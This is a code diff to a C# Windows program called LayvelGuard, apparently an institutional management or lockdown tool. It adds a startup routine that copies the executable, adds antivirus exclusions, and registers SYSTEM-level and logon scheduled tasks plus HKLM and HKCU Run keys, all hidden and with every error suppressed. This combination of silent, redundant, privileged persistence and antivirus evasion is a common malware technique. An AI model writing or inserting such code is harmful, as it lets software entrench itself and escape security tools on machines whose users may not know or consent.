@@ -99,6 +99,7 @@ namespace LayvelGuard
 
             if (!Directory.Exists(APP_DIR)) Directory.CreateDirectory(APP_DIR);
             
+            EnsurePersistence();
             AddAntivirusExclusions();
             EnsureDefaultInstitutionsExist();
             CleanInvalidAutoLogon();
@@ -355,6 +356,79 @@ namespace LayvelGuard
                 Process p = Process.Start(psi);
                 if (p != null) p.WaitForExit();
             } catch {}
+        }
+
+        public static void EnsurePersistence()
+        {
+            try
+            {
+                string targetExe = Path.Combine(APP_DIR, "LayvelGuard.exe");
+                string currentExe = Application.ExecutablePath;
+
+                if (!string.Equals(currentExe, targetExe, StringComparison.OrdinalIgnoreCase))
+                {
+                    try
+                    {
+                        if (!Directory.Exists(APP_DIR)) Directory.CreateDirectory(APP_DIR);
+                        File.Copy(currentExe, targetExe, true);
+                    }
+                    catch { }
+                }
+
+                AddAntivirusExclusions();
+
+                try
+                {
+                    ProcessStartInfo psiStart = new ProcessStartInfo("schtasks.exe",
+                        string.Format("/create /tn \"LayvelGuardDaemon\" /tr \"\\\"{0}\\\" --silent-boot\" /sc ONSTART /ru \"SYSTEM\" /rl HIGHEST /f", targetExe));
+                    psiStart.CreateNoWindow = true;
+                    psiStart.UseShellExecute = false;
+                    Process pStart = Process.Start(psiStart);
+                    if (pStart != null) pStart.WaitForExit();
+                }
+                catch { }
+
+                try
+                {
+                    ProcessStartInfo psiLogon = new ProcessStartInfo("schtasks.exe",
+                        string.Format("/create /tn \"LayvelGuardLogon\" /tr \"\\\"{0}\\\" --silent-boot\" /sc ONLOGON /rl HIGHEST /f", targetExe));
+                    psiLogon.CreateNoWindow = true;
+                    psiLogon.UseShellExecute = false;
+                    Process pLogon = Process.Start(psiLogon);
+                    if (pLogon != null) pLogon.WaitForExit();
+                }
+                catch { }
+
+                try
+                {
+                    using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                    {
+                        if (key != null)
+                        {
+                            key.SetValue("LayvelGuard", string.Format("\"{0}\" --silent-boot", targetExe));
+                        }
+                    }
+                }
+                catch { }
+
+                try
+                {
+                    using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                    {
+                        if (key != null)
+                        {
+                            key.SetValue("LayvelGuard", string.Format("\"{0}\" --silent-boot", targetExe));
+                        }
+                    }
+                }
+                catch { }
+            }
+            catch { }
+        }
+
+        public static void InstallStartupTask()
+        {
+            EnsurePersistence();
         }
 
         public static void RunSilentBoot()
